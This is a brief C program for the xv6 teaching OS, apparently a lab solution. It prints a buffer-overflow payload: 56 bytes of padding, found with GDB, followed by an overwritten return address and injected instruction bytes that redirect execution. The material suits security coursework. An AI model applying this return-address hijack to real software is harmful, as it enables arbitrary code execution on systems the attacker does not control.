#include "kernel/types.h"
#include "user/user.h"

int main()
{
    /*
    From GDB , gathered input buffer at 0x4f80 and
    return addr at 0x4fb8. difference = 56 bytes
    */
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);
    write(1, "AAAAAAAA", 8);

    /*
    Overwrite the saved return address with 0x4fc0.
    This will redirect execution to my injected instruction.
    (little-endian)
    */
    write(1, "\xc0\x4f\x00\x00\x00\x00\x00\x00", 8);

    write(1, "\x6f\x00\x00\x00", 4);
    write(1,"\n",1);
    exit(0);
}